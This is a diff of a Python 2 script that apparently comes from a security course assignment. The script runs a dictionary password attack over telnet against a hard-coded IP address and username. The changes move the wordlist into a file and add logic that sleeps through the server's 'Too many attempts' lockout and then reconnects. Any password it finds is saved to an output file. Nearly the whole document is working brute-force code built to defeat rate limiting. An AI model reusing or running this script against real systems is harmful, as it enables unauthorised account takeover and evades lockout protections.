@@ -3,28 +3,21 @@
 import socket
 import errno
 import requests
-from requests.auth import HTTPBasicAuth
-
 import getpass
 import sys
 import telnetlib
-
-import personalServer as ps
-
 import time
-
 import re
+import utils
+from requests.auth import HTTPBasicAuth
+import personalServer as ps
 
 UNAME = 'ceneri' 
 IP_ADDRESS = '128.114.59.215'
 
 IN_FILE = "personalServer.txt"
 OUT_FILE = "dictionaryPasswd.txt"
-
-dictionary = ['united',  'manchester', 'manu',
-	 'reds', 'devils', 'trafford', 'reds', 'devils', 'trafford', 'manutd'
-	]
-
+DICT_FILE = "dictionary.txt"
 
 def get_p_port():
 	file = open(IN_FILE, "r")
@@ -37,30 +30,30 @@ def get_p_port():
 
 def main():
 
-	toomany = re.compile("Too many")
-	pw = re.compile("Pass")
-
 	HOST = IP_ADDRESS
 
+	#Open output files
 	file = open(OUT_FILE, "w")
 
+	#Get input from txt files
+	dictionary = utils.get_file_input_as_list(DICT_FILE)
 	personalPort = get_p_port()
-
 	skeletonKey = ps.get_s_key()
-
-	#dictionary attaqck here
-
 	dictLen = len(dictionary)
-	for index in range(dictLen):
 
-		print "Index", index
+	#Regular expressions needed
+	pw = re.compile("Pass")
+	toomany = re.compile("Too many")
+	
 
-		tnet = telnetlib.Telnet(HOST, personalPort)
-		
+	#Test every possible password in dictionary
+	for pwd in dictionary:
+
 		try: 
-			pwd = dictionary[index]
 
-			#print sKey
+			#Handshake
+			tnet = telnetlib.Telnet(HOST, personalPort)
+
 			tnet.write(skeletonKey + "\n")
 
 			tnet.read_until("Username: ")
@@ -71,50 +64,48 @@ def main():
 
 			indexFound = expected[0]
 
-
-			#too many
+			#If too many attempt have been made
 			if indexFound == 0:
-				print "F"
-				print "Too many attempts", pwd
-				print "Sleeping 600 seconds"
+
+				#Sleep
+				print pwd, "could not be tested because of too many attempts, Sleeping 600 seconds"
 				time.sleep(605)
-				#attempt conection again
+
+				#Attempt conection again after sleep
+				tnet = telnetlib.Telnet(HOST, personalPort)
+
 				tnet.write(skeletonKey + "\n")
 
 				tnet.read_until("Username: ")
-
-				print "D"
 
 				tnet.write(UNAME + "\n")
 
 				expected = tnet.expect([toomany, pw])
 
+			#Try password
 			tnet.write(pwd + "\n")
 
-			print "H"
-
-			consoleRead = tnet.read_all()
-
-			print "I"
+			consoleRead = tnet.read_until('Command')
 
 			match = re.search('Incorrect', consoleRead)
 		
+			#If response matches 'Incorrect', not a password try another one
 			if match:
 				print "Not a password:", pwd
 				continue
+			
+			#Password found, save it to outut file
 			else:
-				print "Final console", consoleRead
 				print "PASSWORD:", pwd
+				file.write(pwd + '\n')
 				break
 
 		except EOFError, v:
 
 			print "Exception"
 			continue
-		#print "no"
 
 	file.close()
-
 
 
 if __name__ == '__main__':
